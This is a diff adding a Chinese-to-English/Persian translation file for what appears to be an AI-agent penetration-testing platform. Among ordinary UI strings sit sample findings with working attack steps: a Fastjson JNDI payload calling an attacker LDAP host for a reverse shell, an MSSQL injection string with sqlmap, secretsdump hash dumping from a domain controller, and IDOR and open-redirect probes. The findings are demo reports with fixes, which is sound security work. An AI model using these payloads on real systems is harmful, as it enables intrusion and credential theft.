@@ -1,0 +1,1182 @@
+{
+  "等待删除": {
+    "en": "Pending deletion",
+    "fa": "در انتظار حذف"
+  },
+  "系统配置": {
+    "en": "System settings",
+    "fa": "پیکربندی سیستم"
+  },
+  "绑定域名": {
+    "en": "Bound domains",
+    "fa": "دامنه‌های متصل"
+  },
+  "缓存命中率": {
+    "en": "Cache hit rate",
+    "fa": "نرخ برخورد کش"
+  },
+  "网络搜索": {
+    "en": "Web search",
+    "fa": "جستجوی وب"
+  },
+  "置顶": {
+    "en": "Pin",
+    "fa": "سنجاق"
+  },
+  "自定义": {
+    "en": "Custom",
+    "fa": "سفارشی"
+  },
+  "节点 #${node.id}": {
+    "en": "Node #${node.id}",
+    "fa": "گره #${node.id}"
+  },
+  "规则已创建": {
+    "en": "Rule created",
+    "fa": "قانون ایجاد شد"
+  },
+  "规则已删除": {
+    "en": "Rule deleted",
+    "fa": "قانون حذف شد"
+  },
+  "规则已更新": {
+    "en": "Rule updated",
+    "fa": "قانون به‌روزرسانی شد"
+  },
+  "解析值": {
+    "en": "Record value",
+    "fa": "مقدار رکورد"
+  },
+  "解析类型": {
+    "en": "Record type",
+    "fa": "نوع رکورد"
+  },
+  "触发": {
+    "en": "Trigger",
+    "fa": "محرک"
+  },
+  "订单接口测试意图从 API 任务目标中选定": {
+    "en": "Order API test intent selected from the API task goals",
+    "fa": "قصد آزمون رابط سفارش از اهداف وظیفه API انتخاب شد"
+  },
+  "证据 / PoC": {
+    "en": "Evidence / PoC",
+    "fa": "مدرک / PoC"
+  },
+  "证明": {
+    "en": "Proves",
+    "fa": "اثبات"
+  },
+  "请求方法": {
+    "en": "Request method",
+    "fa": "روش درخواست"
+  },
+  "请输入 CIDR 网段": {
+    "en": "Enter a CIDR range",
+    "fa": "یک محدوده CIDR وارد کنید"
+  },
+  "请输入有效 IP": {
+    "en": "Enter a valid IP",
+    "fa": "یک IP معتبر وارد کنید"
+  },
+  "请输入有效域名或 URL": {
+    "en": "Enter a valid domain or URL",
+    "fa": "یک دامنه یا URL معتبر وارد کنید"
+  },
+  "资产同步": {
+    "en": "Asset sync",
+    "fa": "همگام‌سازی دارایی‌ها"
+  },
+  "资产拦截": {
+    "en": "Asset intercept",
+    "fa": "رهگیری دارایی"
+  },
+  "资产数": {
+    "en": "Asset count",
+    "fa": "تعداد دارایی"
+  },
+  "资产范围": {
+    "en": "Asset scope",
+    "fa": "محدوده دارایی"
+  },
+  "转人工审批": {
+    "en": "Require human approval",
+    "fa": "ارجاع برای تأیید انسانی"
+  },
+  "输入消息，@ 引用记录，Enter 发送": {
+    "en": "Type a message, use @ to cite a record, Enter to send",
+    "fa": "پیام بنویسید، با @ یک رکورد را ذکر کنید، Enter برای ارسال"
+  },
+  "过滤资产": {
+    "en": "Filter assets",
+    "fa": "فیلتر دارایی‌ها"
+  },
+  "运行中": {
+    "en": "Running",
+    "fa": "در حال اجرا"
+  },
+  "运行中 Worker": {
+    "en": "Running workers",
+    "fa": "Workerهای در حال اجرا"
+  },
+  "运行中的任务必须先暂停": {
+    "en": "Running tasks must be paused first",
+    "fa": "وظایف در حال اجرا را ابتدا متوقف کنید"
+  },
+  "还原中": {
+    "en": "Restoring",
+    "fa": "در حال بازیابی"
+  },
+  "还原任务": {
+    "en": "Restore task",
+    "fa": "بازیابی وظیفه"
+  },
+  "还原失败": {
+    "en": "Restore failed",
+    "fa": "بازیابی ناموفق بود"
+  },
+  "选择当前页全部": {
+    "en": "Select all on this page",
+    "fa": "انتخاب همه در این صفحه"
+  },
+  "选择流量 ${e.id}": {
+    "en": "Select traffic ${e.id}",
+    "fa": "انتخاب ترافیک ${e.id}"
+  },
+  "通知推送": {
+    "en": "Push notifications",
+    "fa": "اعلان‌ها"
+  },
+  "（无描述）": {
+    "en": "(No description)",
+    "fa": "(بدون توضیح)"
+  },
+  "（无摘要）": {
+    "en": "(No summary)",
+    "fa": "(بدون خلاصه)"
+  },
+  " : \"\"}${entry.is_error ? \" · 异常\" : \"\"}": {
+    "en": " : \"\"}${entry.is_error ? \" · Error\" : \"\"}",
+    "fa": " : \"\"}${entry.is_error ? \" · خطا\" : \"\"}"
+  },
+  " · 不限流": {
+    "en": " · No rate limit",
+    "fa": " · بدون محدودیت نرخ"
+  },
+  " · 使用主上下文摘要": {
+    "en": " · Using main context summary",
+    "fa": " · با خلاصه زمینه اصلی"
+  },
+  " · 出 ": {
+    "en": " · Out ",
+    "fa": " · خروجی "
+  },
+  " · 加载中…": {
+    "en": " · Loading…",
+    "fa": " · در حال بارگذاری…"
+  },
+  " · 原文": {
+    "en": " · Raw",
+    "fa": " · خام"
+  },
+  " · 原文（SSE）": {
+    "en": " · Raw (SSE)",
+    "fa": " · خام (SSE)"
+  },
+  " · 含早期问答摘要": {
+    "en": " · Includes earlier Q&A summary",
+    "fa": " · شامل خلاصه پرسش‌وپاسخ‌های قبلی"
+  },
+  " · 失败 ": {
+    "en": " · Failed ",
+    "fa": " · ناموفق "
+  },
+  " · 当前为预览": {
+    "en": " · Preview only",
+    "fa": " · فقط پیش‌نمایش"
+  },
+  " · 来源任务 #${asset.source_task_id}": {
+    "en": " · Source task #${asset.source_task_id}",
+    "fa": " · وظیفه مبدأ #${asset.source_task_id}"
+  },
+  " · 缓 ": {
+    "en": " · Cache ",
+    "fa": " · کش "
+  },
+  " · 默认": {
+    "en": " · Default",
+    "fa": " · پیش‌فرض"
+  },
+  " · 默认限流 ${defaultRate} 条/分钟": {
+    "en": " · Default rate limit ${defaultRate}/min",
+    "fa": " · محدودیت نرخ پیش‌فرض ${defaultRate} در دقیقه"
+  },
+  "# SKILL.md\\n\\n（demo）这是该 skill 的说明文件示例。": {
+    "en": "# SKILL.md\n\n(demo) Sample description file for this skill.",
+    "fa": "# SKILL.md\n\n(demo) این یک فایل توضیح نمونه برای این skill است."
+  },
+  "# 工作区笔记\\n\\n（demo）这是工作空间根目录下的示例文件，可在线编辑并保存。\\n": {
+    "en": "# Workspace notes\n\n(demo) This sample file is in the workspace root. You can edit and save it online.\n",
+    "fa": "# یادداشت‌های فضای کار\n\n(demo) این فایل نمونه در ریشه فضای کار است و می‌توان آن را آنلاین ویرایش و ذخیره کرد.\n"
+  },
+  "# 检查摘要\\n\\n本轮验证已完成，整理已有证据与后续建议。": {
+    "en": "# Review summary\n\nThis verification round is complete. Existing evidence and follow-up suggestions are collected here.",
+    "fa": "# خلاصه بررسی\n\nاین دور از راستی‌آزمایی تمام شد. شواهد موجود و پیشنهادهای بعدی اینجا گرد آمده‌اند."
+  },
+  "## 执行方法\\n\\n1. 先探测错误\\n2. 区分盲注类型\\n\\n脚本放 scripts/ 目录。": {
+    "en": "## Method\n\n1. Probe for errors first\n2. Distinguish blind injection types\n\nPut scripts in the scripts/ directory.",
+    "fa": "## روش اجرا\n\n1. ابتدا خطاها را بررسی کنید\n2. انواع تزریق کور را از هم جدا کنید\n\nاسکریپت‌ها را در پوشه scripts/ بگذارید."
+  },
+  "## 漏洞概述\\n\\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\\n\\n## 影响\\n\\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\\n- 结合后续提权，成为进入内网的跳板\\n\\n## 复现步骤\\n\\n1. 构造 JNDI payload：\\n\\n```json\\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\\n```\\n\\n2. `POST /api/import`，`Content-Type: application/json`\\n3. 目标回连 dnslog，落地反弹 shell\\n\\n## 修复建议\\n\\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\\n- `/api/import` 增加鉴权与来源校验\\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\\n": {
+    "en": "## Overview\n\nThe `/api/import` endpoint on `shop.acme.com` parses user-controlled JSON with **Fastjson 1.2.24**. `safeMode` is off, so `@type` can name an arbitrary class and trigger **JNDI injection → remote command execution**.\n\n## Impact\n\n- Without authentication, an attacker can run arbitrary commands on the DMZ web server (`www-data@dmz-web01`)\n- With later privilege escalation, this host becomes a pivot into the internal network\n\n## Steps to reproduce\n\n1. Build a JNDI payload:\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import` with `Content-Type: application/json`\n3. The target calls back to dnslog and a reverse shell lands\n\n## Remediation\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`\n- Add authentication and origin checks on `/api/import`\n- Restrict egress: do not let business servers initiate LDAP/RMI connections\n",
+    "fa": "## خلاصه آسیب‌پذیری\n\nرابط `/api/import` در `shop.acme.com` JSON تحت کنترل کاربر را با **Fastjson 1.2.24** تجزیه می‌کند. `safeMode` خاموش است، پس با `@type` می‌توان هر کلاسی را مشخص کرد و **تزریق JNDI → اجرای فرمان از راه دور** را فعال کرد.\n\n## اثر\n\n- مهاجم بدون احراز هویت می‌تواند روی سرور وب DMZ فرمان دلخواه اجرا کند (`www-data@dmz-web01`)\n- با ارتقای دسترسی بعدی، این میزبان سکوی ورود به شبکه داخلی می‌شود\n\n## گام‌های بازتولید\n\n1. یک payload از نوع JNDI بسازید:\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import` با `Content-Type: application/json`\n3. هدف به dnslog برمی‌گردد و reverse shell برقرار می‌شود\n\n## پیشنهاد اصلاح\n\n- Fastjson را به **1.2.83+** ارتقا دهید و `safeMode` را روشن کنید\n- برای `/api/import` احراز هویت و بررسی مبدأ اضافه کنید\n- محدودیت خروج: سرورهای کسب‌وکار نباید خودشان اتصال LDAP/RMI آغاز کنند\n"
+  },
+  "## 漏洞概述\\n\\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\\n\\n## 影响\\n\\n- 可读取 `acme_prod` 库的表结构与用户/订单数据\\n- 报错回显便于快速构造利用，风险高\\n\\n## 复现步骤\\n\\n1. 触发报错注入：\\n\\n```\\nGET /search?q=1\\' AND 1=CONVERT(int,@@version)--\\n```\\n\\n2. 响应回显 MSSQL 版本报错，确认可注入\\n3. 进一步枚举库：`sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\\n\\n## 修复建议\\n\\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\\n- 关闭生产环境详细报错回显\\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\\n": {
+    "en": "## Overview\n\nThe `q` parameter on `www.acme.com/search` has **error-based SQL injection** (MSSQL) and can read the database version, schema, and sensitive data.\n\n## Impact\n\n- Table structure and user/order data in the `acme_prod` database can be read\n- Error output makes an exploit quick to build; the risk is high\n\n## Steps to reproduce\n\n1. Trigger the error-based injection:\n\n```\nGET /search?q=1\\' AND 1=CONVERT(int,@@version)--\n```\n\n2. The response echoes an MSSQL version error, confirming the injection\n3. Enumerate databases next: `sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## Remediation\n\n- Switch entirely to parameterized queries / prepared statements and stop concatenating strings\n- Disable detailed error output in production\n- Give the database account least privilege and disable dangerous extensions such as `xp_cmdshell`\n",
+    "fa": "## خلاصه آسیب‌پذیری\n\nپارامتر `q` در `www.acme.com/search` **تزریق SQL مبتنی بر خطا** (MSSQL) دارد و می‌تواند نسخه پایگاه داده، ساختار پایگاه و داده حساس را بخواند.\n\n## اثر\n\n- ساختار جدول‌ها و داده کاربران/سفارش‌ها در پایگاه `acme_prod` قابل خواندن است\n- نمایش خطا ساخت بهره‌برداری را سریع می‌کند و خطر بالا است\n\n## گام‌های بازتولید\n\n1. تزریق مبتنی بر خطا را فعال کنید:\n\n```\nGET /search?q=1\\' AND 1=CONVERT(int,@@version)--\n```\n\n2. پاسخ، خطای نسخه MSSQL را نشان می‌دهد و تزریق تأیید می‌شود\n3. سپس پایگاه‌ها را بشمارید: `sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## پیشنهاد اصلاح\n\n- همه‌جا از پرس‌وجوی پارامتری / عبارت از پیش‌کامپایل‌شده استفاده کنید و الحاق رشته را کنار بگذارید\n- نمایش خطای مفصل را در محیط تولید خاموش کنید\n- حساب پایگاه داده کمترین دسترسی را داشته باشد و افزونه‌های خطرناک مانند `xp_cmdshell` را غیرفعال کنید\n"
+  },
+  "## 漏洞概述\\n\\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\\n\\n## 影响\\n\\n- 取得域管理员权限，可控制全域主机与账号\\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\\n- 内部靶标达成\\n\\n## 复现步骤\\n\\n1. 以 `svc_deploy` 登录并导出哈希：\\n\\n```\\npsexec.py acme/svc_deploy@10.10.10.10\\nsecretsdump.py acme/svc_deploy@10.10.10.10\\n```\\n\\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\\n\\n## 修复建议\\n\\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\\n": {
+    "en": "## Overview\n\nFrom an external Fastjson RCE foothold in the DMZ, sudo privilege escalation, a dual-NIC crossing, and unauthenticated Jenkins RCE yielded the domain account `svc_deploy`. That account is in **Domain Admins** and ended in full control of domain controller **DC01**.\n\n## Impact\n\n- Domain admin rights allow control of every host and account in the domain\n- `secretsdump` exported every domain NTLM hash (including `krbtgt`), which can be used to forge a golden ticket and stay resident\n- The internal objective was achieved\n\n## Steps to reproduce\n\n1. Sign in as `svc_deploy` and dump hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Obtain SYSTEM on DC01 and export every hash in the domain\n\n## Remediation\n\n- Reduce service-account rights, remove them from Domain Admins, and apply tiered administration (tiering)\n- Reset `krbtgt` twice in a row and rotate strong passwords for service accounts\n- Repair DMZ→internal boundary isolation and the RCE / privilege-escalation chain above\n",
+    "fa": "## خلاصه آسیب‌پذیری\n\nاز راه RCE مربوط به Fastjson در شبکه بیرونی، جای پا در DMZ گرفته شد؛ سپس با ارتقای sudo، عبور از دو کارت شبکه و RCE بدون احراز هویت Jenkins حساب دامنه `svc_deploy` به دست آمد. این حساب عضو **Domain Admins** است و در پایان کنترل کامل کنترل‌کننده دامنه **DC01** حاصل شد.\n\n## اثر\n\n- دسترسی مدیر دامنه، کنترل همه میزبان‌ها و حساب‌های دامنه را ممکن می‌کند\n- `secretsdump` همه هش‌های NTLM دامنه (از جمله `krbtgt`) را استخراج کرد و با آن می‌توان بلیت طلایی ساخت و ماندگار شد\n- هدف داخلی محقق شد\n\n## گام‌های بازتولید\n\n1. با `svc_deploy` وارد شوید و هش‌ها را استخراج کنید:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. دسترسی SYSTEM روی DC01 را بگیرید و همه هش‌های دامنه را استخراج کنید\n\n## پیشنهاد اصلاح\n\n- دسترسی حساب‌های سرویس را محدود کنید، آن‌ها را از Domain Admins خارج کنید و مدیریت لایه‌ای (tiering) را اعمال کنید\n- `krbtgt` را دو بار پشت سر هم بازنشانی کنید و گذرواژه قوی حساب‌های سرویس را عوض کنید\n- جداسازی مرز DMZ به شبکه داخلی و زنجیره RCE / ارتقای دسترسی بالا را اصلاح کنید\n"
+  },
+  "### 演示记录\\n\\n已关联原漏洞。此环境未连接真实 Agent，也未向目标发送请求；请在实际部署中执行复测。": {
+    "en": "### Demo record\n\nLinked to the original finding. This environment is not connected to a real Agent and did not send any request to the target. Run the retest in a real deployment.",
+    "fa": "### رکورد نمایشی\n\nبه آسیب‌پذیری اصلی متصل شد. این محیط به Agent واقعی وصل نیست و درخواستی به هدف نفرستاده است. بازآزمایی را در استقرار واقعی انجام دهید."
+  },
+  "#${item.id}（${item.error || \"任务已不存在\"}）": {
+    "en": "#${item.id} (${item.error || \"Task no longer exists\"})",
+    "fa": "#${item.id} (${item.error || \"وظیفه دیگر وجود ندارد\"})"
+  },
+  "${(ms / 3_600_000).toFixed(1)} 小时": {
+    "en": "${(ms / 3_600_000).toFixed(1)} hours",
+    "fa": "${(ms / 3_600_000).toFixed(1)} ساعت"
+  },
+  "${Math.floor(h / 24)}d 前": {
+    "en": "${Math.floor(h / 24)}d ago",
+    "fa": "${Math.floor(h / 24)}d پیش"
+  },
+  "${Math.floor(sec / 3600)} 小时前": {
+    "en": "${Math.floor(sec / 3600)} hours ago",
+    "fa": "${Math.floor(sec / 3600)} ساعت پیش"
+  },
+  "${Math.floor(sec / 60)} 分钟前": {
+    "en": "${Math.floor(sec / 60)} minutes ago",
+    "fa": "${Math.floor(sec / 60)} دقیقه پیش"
+  },
+  "${Math.floor(sec / 86400)} 天前": {
+    "en": "${Math.floor(sec / 86400)} days ago",
+    "fa": "${Math.floor(sec / 86400)} روز پیش"
+  },
+  "${Math.round(ms / 1000)} 秒": {
+    "en": "${Math.round(ms / 1000)} seconds",
+    "fa": "${Math.round(ms / 1000)} ثانیه"
+  },
+  "${Math.round(ms / 60_000)} 分钟": {
+    "en": "${Math.round(ms / 60_000)} minutes",
+    "fa": "${Math.round(ms / 60_000)} دقیقه"
+  },
+  "${action === \"pause\" ? \"批量暂停\" : \"批量继续\"}失败：${(error as Error).message}": {
+    "en": "${action === \"pause\" ? \"Pause selected\" : \"Resume selected\"} failed: ${(error as Error).message}",
+    "fa": "${action === \"pause\" ? \"توقف دسته‌ای\" : \"ادامه دسته‌ای\"} ناموفق بود: ${(error as Error).message}"
+  },
+  "${action === \"pause\" ? \"暂停\" : \"继续\"}失败：${(e as Error).message}": {
+    "en": "${action === \"pause\" ? \"Pause\" : \"Resume\"} failed: ${(e as Error).message}",
+    "fa": "${action === \"pause\" ? \"توقف\" : \"ادامه\"} ناموفق بود: ${(e as Error).message}"
+  },
+  "${agg.usedCount} 个被调用过": {
+    "en": "${agg.usedCount} called",
+    "fa": "${agg.usedCount} فراخوانی‌شده"
+  },
+  "${backupCount} 个备用": {
+    "en": "${backupCount} backups",
+    "fa": "${backupCount} پشتیبان"
+  },
+  "${count} 个任务": {
+    "en": "${count} tasks",
+    "fa": "${count} وظیفه"
+  },
+  "${current.agent_name || current.conv_agent_key || \"Agent\"} · 工具请求": {
+    "en": "${current.agent_name || current.conv_agent_key || \"Agent\"} · Tool request",
+    "fa": "${current.agent_name || current.conv_agent_key || \"Agent\"} · درخواست ابزار"
+  },
+  "${d.date} · ${d.calls} 次 · ${fmtTokens(total)} tokens": {
+    "en": "${d.date} · ${d.calls} calls · ${fmtTokens(total)} tokens",
+    "fa": "${d.date} · ${d.calls} بار · ${fmtTokens(total)} tokens"
+  },
+  "${deleteSummary(result)}；部分外部数据清理未完成：${result.cleanup_warning}": {
+    "en": "${deleteSummary(result)}; some external data was not fully cleaned up: ${result.cleanup_warning}",
+    "fa": "${deleteSummary(result)}؛ پاک‌سازی بخشی از داده‌های خارجی کامل نشد: ${result.cleanup_warning}"
+  },
+  "${deleteVerb}中…": {
+    "en": "${deleteVerb}…",
+    "fa": "${deleteVerb}…"
+  },
+  "${failed.length} 个任务删除失败：${head}${failed.length > 3 ? \" 等\" : \"\"}": {
+    "en": "${failed.length} tasks failed to delete: ${head}${failed.length > 3 ? \" and more\" : \"\"}",
+    "fa": "${failed.length} وظیفه حذف نشد: ${head}${failed.length > 3 ? \" و موارد دیگر\" : \"\"}"
+  },
+  "${failed.length} 个任务操作失败：${details}${failed.length > 3 ? \" 等\" : \"\"}": {
+    "en": "${failed.length} task actions failed: ${details}${failed.length > 3 ? \" and more\" : \"\"}",
+    "fa": "عملیات ${failed.length} وظیفه ناموفق بود: ${details}${failed.length > 3 ? \" و موارد دیگر\" : \"\"}"
+  },
+  "${failed.length} 个任务未能移动：${details}${failed.length > 3 ? \" 等\" : \"\"}": {
+    "en": "${failed.length} tasks could not be moved: ${details}${failed.length > 3 ? \" and more\" : \"\"}",
+    "fa": "${failed.length} وظیفه جابه‌جا نشد: ${details}${failed.length > 3 ? \" و موارد دیگر\" : \"\"}"
+  },
+  "${failed.length} 个对话删除失败：${details}${failed.length > 3 ? \" 等\" : \"\"}": {
+    "en": "${failed.length} conversations failed to delete: ${details}${failed.length > 3 ? \" and more\" : \"\"}",
+    "fa": "حذف ${failed.length} گفتگو ناموفق بود: ${details}${failed.length > 3 ? \" و موارد دیگر\" : \"\"}"
+  },
+  "${failed} 个任务无法还原": {
+    "en": "${failed} tasks could not be restored",
+    "fa": "${failed} وظیفه بازیابی نشد"
+  },
+  "${failed} 个归档无法删除": {
+    "en": "${failed} archives could not be deleted",
+    "fa": "${failed} بایگانی حذف نشد"
+  },
+  "${filter.asset_ids.length} 个资产": {
+    "en": "${filter.asset_ids.length} assets",
+    "fa": "${filter.asset_ids.length} دارایی"
+  },
+  "${filter.task_ids.length} 个任务": {
+    "en": "${filter.task_ids.length} tasks",
+    "fa": "${filter.task_ids.length} وظیفه"
+  },
+  "${filteredConversations.length} / ${convs.length} 个": {
+    "en": "${filteredConversations.length} / ${convs.length}",
+    "fa": "${filteredConversations.length} / ${convs.length}"
+  },
+  "${formatArchiveBytes(archive.compressed_size)} · 节省 ${saved.toFixed(0)}%": {
+    "en": "${formatArchiveBytes(archive.compressed_size)} · saved ${saved.toFixed(0)}%",
+    "fa": "${formatArchiveBytes(archive.compressed_size)} · ${saved.toFixed(0)}٪ صرفه‌جویی"
+  },
+  "${group.runningCount} 个对话运行中": {
+    "en": "${group.runningCount} conversations running",
+    "fa": "${group.runningCount} گفتگو در حال اجرا"
+  },
+  "${group.task_name}（任务 #${group.task_id}）": {
+    "en": "${group.task_name} (task #${group.task_id})",
+    "fa": "${group.task_name} (وظیفه #${group.task_id})"
+  },
+  "${head}${UPLOAD_MARKER} worker 可用 Read/Bash 按路径打开：\\n${bullets}\\n": {
+    "en": "${head}${UPLOAD_MARKER} The worker can open these by path with Read/Bash:\n${bullets}\n",
+    "fa": "${head}${UPLOAD_MARKER} worker می‌تواند این‌ها را با Read/Bash از روی مسیر باز کند:\n${bullets}\n"
+  },
+  "${h}h 前": {
+    "en": "${h}h ago",
+    "fa": "${h}h پیش"
+  },
+  "${mcpOn ? \"关联\" : \"取消关联\"}「${mcpName}」": {
+    "en": "${mcpOn ? \"Linked\" : \"Unlinked\"} “${mcpName}”",
+    "fa": "${mcpOn ? \"متصل شد\" : \"اتصال لغو شد\"} «${mcpName}»"
+  },
+  "${missing.length} 个不存在的 skill": {
+    "en": "${missing.length} missing skills",
+    "fa": "${missing.length} skill ناموجود"
+  },
+  "${msg}\\n\\n是否覆盖同名 Skill？": {
+    "en": "${msg}\n\nOverwrite the Skill with the same name?",
+    "fa": "${msg}\n\nSkill همنام بازنویسی شود؟"
+  },
+  "${m}m 前": {
+    "en": "${m}m ago",
+    "fa": "${m}m پیش"
+  },
+  "${on ? \"已取消\" : \"已开启\"} MCP「${name}」可见": {
+    "en": "${on ? \"Disabled\" : \"Enabled\"} visibility for MCP “${name}”",
+    "fa": "${on ? \"لغو نمایش\" : \"فعال‌سازی نمایش\"} MCP «${name}»"
+  },
+  "${on ? \"已取消\" : \"已开启\"} Skill「${name}」可见": {
+    "en": "${on ? \"Disabled\" : \"Enabled\"} visibility for Skill “${name}”",
+    "fa": "${on ? \"لغو نمایش\" : \"فعال‌سازی نمایش\"} Skill «${name}»"
+  },
+  "${on ? \"已解绑\" : \"已绑定\"}工具「${t.key}」": {
+    "en": "${on ? \"Unbound\" : \"Bound\"} tool “${t.key}”",
+    "fa": "${on ? \"جدا شد\" : \"متصل شد\"} ابزار «${t.key}»"
+  },
+  "${open ? \"收起\" : \"展开\"}审批 #${row.id}": {
+    "en": "${open ? \"Collapse\" : \"Expand\"} approval #${row.id}",
+    "fa": "${open ? \"جمع کردن\" : \"باز کردن\"} تأیید #${row.id}"
+  },
+  "${pinned ? \"取消置顶\" : \"置顶\"}失败：${(e as Error).message}": {
+    "en": "${pinned ? \"Unpin\" : \"Pin\"} failed: ${(e as Error).message}",
+    "fa": "${pinned ? \"برداشتن سنجاق\" : \"سنجاق کردن\"} ناموفق بود: ${(e as Error).message}"
+  },
+  "${pinned ? \"取消置顶\" : \"置顶\"}失败：${(error as Error).message}": {
+    "en": "${pinned ? \"Unpin\" : \"Pin\"} failed: ${(error as Error).message}",
+    "fa": "${pinned ? \"برداشتن سنجاق\" : \"سنجاق کردن\"} ناموفق بود: ${(error as Error).message}"
+  },
+  "${s.tools.length} 个工具": {
+    "en": "${s.tools.length} tools",
+    "fa": "${s.tools.length} ابزار"
+  },
+  "${selectedView === \"new\" ? \"创建\" : \"更新\"}分类失败：${(error as Error).message}": {
+    "en": "${selectedView === \"new\" ? \"Create\" : \"Update\"} category failed: ${(error as Error).message}",
+    "fa": "${selectedView === \"new\" ? \"ایجاد\" : \"به‌روزرسانی\"} دسته ناموفق بود: ${(error as Error).message}"
+  },
+  "${summary}；部分外部数据清理未完成：${warnings.join(\"；\")}": {
+    "en": "${summary}; some external data was not fully cleaned up: ${warnings.join(\"; \")}",
+    "fa": "${summary}؛ پاک‌سازی بخشی از داده‌های خارجی کامل نشد: ${warnings.join(\"؛ \")}"
+  },
+  "${systemTools.length} / ${allSystemCount} 个匹配，点击卡片编辑描述、参数默认值与 Agent 绑定": {
+    "en": "${systemTools.length} / ${allSystemCount} matches. Click a card to edit the description, parameter defaults, and Agent bindings",
+    "fa": "${systemTools.length} / ${allSystemCount} مورد مطابق. برای ویرایش توضیح، مقدار پیش‌فرض پارامترها و اتصال Agent روی کارت کلیک کنید"
+  },
+  "${s}s 前": {
+    "en": "${s}s ago",
+    "fa": "${s}s پیش"
+  },
+  "${traffic.length} 次请求": {
+    "en": "${traffic.length} requests",
+    "fa": "${traffic.length} درخواست"
+  },
+  "+ 新增": {
+    "en": "+ Added",
+    "fa": "+ اضافه‌شده"
+  },
+  "- 删除": {
+    "en": "- Removed",
+    "fa": "- حذف‌شده"
+  },
+  "-1 = 一次都不重试，失败立刻上抛": {
+    "en": "-1 = do not retry; surface the failure immediately",
+    "fa": "-1 = بدون تلاش مجدد؛ شکست بلافاصله بالا می‌رود"
+  },
+  "-1 = 不重跑，该意图直接判为 blocked": {
+    "en": "-1 = do not rerun; mark this intent blocked",
+    "fa": "-1 = بدون اجرای مجدد؛ این قصد مستقیماً blocked می‌شود"
+  },
+  "-1 = 断流直接交给外层的意图重跑": {
+    "en": "-1 = on a dropped stream, hand off to the outer intent retry",
+    "fa": "-1 = با قطع جریان، کار به تلاش مجدد قصد بیرونی سپرده می‌شود"
+  },
+  "-1 = 瞬时失败永不熔断（确定性失败仍然熔断）": {
+    "en": "-1 = transient failures never open the circuit (deterministic failures still do)",
+    "fa": "-1 = شکست گذرا هرگز مدار را قطع نمی‌کند (شکست قطعی همچنان قطع می‌کند)"
+  },
+  "-1 = 空响应直接原样交出": {
+    "en": "-1 = return an empty response as-is",
+    "fa": "-1 = پاسخ خالی همان‌طور که هست برگردانده می‌شود"
+  },
+  ".git 可下载，git-dumper 还原出后端源码": {
+    "en": ".git is downloadable; git-dumper recovered the backend source",
+    "fa": ".git قابل دانلود است؛ git-dumper کد منبع بک‌اند را بازیابی کرد"
+  },
+  ".git 目录对外可访问。": {
+    "en": "The .git directory is publicly accessible.",
+    "fa": "پوشه .git از بیرون در دسترس است."
+  },
+  "/btw 旁路提问": {
+    "en": "/btw side question",
+    "fa": "پرسش جانبی /btw"
+  },
+  "/login?next=https://evil.example 登录后 302 跳到外站。": {
+    "en": "/login?next=https://evil.example redirects off-site with 302 after sign-in.",
+    "fa": "/login?next=https://evil.example پس از ورود با 302 به سایت بیرونی می‌رود."
+  },
+  "/script 可直接访问，无需认证。": {
+    "en": "/script is directly accessible, with no authentication.",
+    "fa": "/script بدون احراز هویت مستقیم در دسترس است."
+  },
+  "/usr/bin/python3（留空=自动检测）": {
+    "en": "/usr/bin/python3 (leave empty to auto-detect)",
+    "fa": "/usr/bin/python3 (خالی بگذارید تا خودکار تشخیص داده شود)"
+  },
+  "/v1/orders?id= 是数字自增 id，典型 IDOR 面。先取自己的单，再改 id 看能否读他人。": {
+    "en": "/v1/orders?id= is a numeric auto-increment id, a typical IDOR surface. Fetch your own order first, then change the id to see whether someone else's order is readable.",
+    "fa": "/v1/orders?id= یک id عددی افزایشی است و سطح معمول IDOR محسوب می‌شود. ابتدا سفارش خود را بگیرید، سپس id را عوض کنید تا ببینید سفارش دیگران خوانده می‌شود یا نه."
+  },
+  "0 = 不限": {
+    "en": "0 = unlimited",
+    "fa": "0 = نامحدود"
+  },
+  "0.5s→1s 指数（封顶 4s）": {
+    "en": "0.5s→1s exponential (capped at 4s)",
+    "fa": "نمایی 0.5s→1s (سقف 4s)"
+  },
+  "0=默认N": {
+    "en": "0 = default N",
+    "fa": "0 = پیش‌فرض N"
+  },
+  "1000 次/分钟无锁定，无验证码。": {
+    "en": "1,000 times per minute, no lockout, no CAPTCHA.",
+    "fa": "1000 بار در دقیقه، بدون قفل و بدون کپچا."
+  },
+  "1min→5min→30min 梯度": {
+    "en": "1min→5min→30min stepped backoff",
+    "fa": "عقب‌نشینی پلکانی 1min→5min→30min"
+  },
